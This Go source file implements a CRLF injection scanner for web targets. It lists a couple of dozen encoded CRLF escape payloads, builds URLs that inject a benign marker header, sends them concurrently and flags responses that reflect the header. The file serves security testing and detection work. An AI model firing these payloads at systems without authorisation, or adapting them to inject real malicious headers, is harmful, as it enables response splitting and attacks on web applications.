package crlf

import (
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/aether-0/httpsuite/pkg/common"
	"github.com/aether-0/httpsuite/pkg/httpclient"
	"github.com/aether-0/httpsuite/pkg/output"
)

const (
	injectedHeaderKey = "X-Injected-Header-By"
	injectedHeaderVal = "httpsuite"
)

// CRLF escape sequences to inject
var escapeList = []string{
	"%0a",
	"%0a%20",
	"%0d",
	"%0d%09",
	"%0d%0a",
	"%0d%0a%09",
	"%0d%0a%20",
	"%0d%20",
	"%20%0a",
	"%20%0d",
	"%20%0d%0a",
	"%23%0a",
	"%23%0d",
	"%23%0d%0a",
	"%25%30%61",
	"%2e%2e%2f%0d%0a",
	"%2f%2e%2e%0d%0a",
	"%2f..%0d%0a",
	"%3f%0d%0a",
	"%e5%98%8a%e5%98%8d",
	"%e5%98%8a%e5%98%8d%0a",
	"%e5%98%8a%e5%98%8d%0d",
	"%e5%98%8a%e5%98%8d%0d%0a",
	"%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d",
	"%00",
	"%u000a",
	"%u000d",
}

// URL path appendages before the CRLF injection
var appendList = []string{
	"",
	"crlftest",
	"?crlftest=",
	"#",
}

// Scanner performs CRLF injection testing
type Scanner struct {
	config  *common.Config
	printer *output.Printer
	client  *httpclient.Client
}

// NewScanner creates a new CRLF scanner
func NewScanner(cfg *common.Config, printer *output.Printer) *Scanner {
	client := httpclient.New(httpclient.Options{
		Timeout:   cfg.Timeout,
		Proxy:     cfg.Proxy,
		UserAgent: cfg.UserAgent,
		Headers:   cfg.Headers,
		Retries:   cfg.Retries,
		Redirect:  false, // Don't follow redirects for CRLF testing
		Insecure:  true,
	})

	return &Scanner{
		config:  cfg,
		printer: printer,
		client:  client,
	}
}

// GenerateURLs generates potential CRLF injection URLs for a given target
func GenerateURLs(baseURL string) []string {
	var urls []string

	if !strings.HasSuffix(baseURL, "/") {
		baseURL += "/"
	}

	for _, appendStr := range appendList {
		for _, escape := range escapeList {
			// Inject header via CRLF: the key-value is URL-encoded in the path
			injectedURL := fmt.Sprintf("%s%s%s%s%%3a%%20%s",
				baseURL, appendStr, escape, injectedHeaderKey, injectedHeaderVal)
			urls = append(urls, injectedURL)
		}
	}

	return urls
}

// Run executes the CRLF scan across all target URLs
func (s *Scanner) Run() {
	s.printer.Info("Starting CRLF injection scan for %d target(s)", len(s.config.URLs))

	var wg sync.WaitGroup
	sem := make(chan struct{}, s.config.Concurrency)

	for _, targetURL := range s.config.URLs {
		testURLs := GenerateURLs(targetURL)
		s.printer.Info("Testing %d CRLF payloads against %s", len(testURLs), targetURL)

		for _, testURL := range testURLs {
			wg.Add(1)
			sem <- struct{}{}
			go func(target, testURL string) {
				defer wg.Done()
				defer func() { <-sem }()

				vulnerable, statusCode, err := s.scan(testURL)
				if err != nil {
					if s.config.Verbose {
						s.printer.Error("CRLF test error for %s: %v", testURL, err)
					}
					return
				}

				if vulnerable {
					s.printer.Result(common.ScanResult{
						URL:        testURL,
						Method:     s.config.Method,
						StatusCode: statusCode,
						Module:     "crlf",
						Detail:     "CRLF injection detected - injected header reflected",
						Vulnerable: true,
					})
				} else if s.config.Verbose {
					s.printer.Result(common.ScanResult{
						URL:        testURL,
						Method:     s.config.Method,
						StatusCode: statusCode,
						Module:     "crlf",
						Detail:     "not vulnerable",
						Vulnerable: false,
					})
				}
			}(targetURL, testURL)
		}
	}
	wg.Wait()
}

// scan tests a single URL for CRLF injection
func (s *Scanner) scan(testURL string) (bool, int, error) {
	req, err := http.NewRequest(s.config.Method, testURL, nil)
	if err != nil {
		return false, 0, fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Set("User-Agent", s.config.UserAgent)
	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return false, 0, err
	}
	defer resp.Body.Close()

	// Check if our injected header appears in the response
	return isVulnerable(resp), resp.StatusCode, nil
}

// isVulnerable checks if the response contains our injected header
func isVulnerable(resp *http.Response) bool {
	for key, values := range resp.Header {
		if key == injectedHeaderKey {
			for _, value := range values {
				if strings.Contains(value, injectedHeaderVal) {
					return true
				}
			}
		}
	}
	return false
}
